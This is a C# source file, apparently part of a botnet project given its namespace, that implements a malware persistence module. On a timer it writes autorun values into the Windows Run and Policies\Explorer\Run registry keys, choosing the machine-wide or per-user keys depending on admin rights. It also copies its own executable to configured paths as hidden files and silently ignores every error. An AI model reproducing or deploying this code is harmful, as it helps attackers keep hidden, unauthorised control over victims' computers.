using System.Diagnostics;
using System.IO;
using System.Timers;
using Microsoft.Win32;

namespace BotNet.Services.Common
{
    public class Persistence
    {
        Factory _factoryService = new Factory();
        private Timer timer = new Timer();
        private string selfPath = Process.GetCurrentProcess().MainModule.FileName;

        public void StartPersistent()
        {
            timer.Interval = Config.PersistentInterval * 0x3e8;
            timer.Elapsed += new ElapsedEventHandler(SetPersistence);
            timer.Start();
        }

        public void StopPersistent()
        {
            timer.Stop();
            timer.Dispose();
        }

        public void SetPersistence(object source, ElapsedEventArgs eArgs)
        {
            RegistryKey key;
            if (Config.AdminStatus)
            {
                try
                {
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    setAutoRunRegistry(key, 0);
                }
                catch { }

                try
                {
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
                    setAutoRunRegistry(key, 1);
                }
                catch { }
            }
            else
            {
                try
                {
                    key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    setAutoRunRegistry(key, 0);
                }
                catch { }

                try
                {
                    key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
                    setAutoRunRegistry(key, 1);
                }
                catch { }
            }


            foreach (string path in Config.FilePath)
            {
                try
                {
                    if (!_factoryService.CheckFile(path))
                    {
                        File.Copy(selfPath, path);
                        File.SetAttributes(path, FileAttributes.Hidden);
                    }
                }
                catch { }
            }

        }

        /// <param name="index">Индекс номер имени массива из конфига RegMon</param>
        private void setAutoRunRegistry(RegistryKey key, byte index)
        {
            if (!key.Equals(Config.RegName[index])
                || (key.Equals(Config.RegName[index])
                && !key.GetValue(Config.RegName[index]).ToString().Contains(Config.FilePath[index]))
            )
            {
                key.SetValue(Config.RegName[index], ('"' + Config.FilePath[index] + '"'));
            }
        }
    }
}
